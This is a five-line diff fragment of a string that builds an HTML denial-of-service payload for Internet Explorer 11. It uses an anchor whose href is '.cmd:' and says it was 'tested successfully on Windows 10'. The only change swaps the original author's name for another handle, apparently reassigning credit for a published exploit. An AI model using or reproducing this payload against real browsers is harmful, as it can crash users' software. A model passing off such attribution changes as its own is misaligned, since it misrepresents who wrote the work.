@@ -1,5 +1,5 @@
 payload=('<br>\n'+
-'<center>MSIE v11.371.16299 Denial Of Service by hyp3rlinx <br>\n'+
+'<center>MSIE v11.371.16299 Denial Of Service by TheEyeOfCyber <br>\n'+
 '<a href=".cmd:" id="hate">crashy ware shee</a>\n'+
 '<br>\n'+
 'Tested successfully on Windows 10\n'+
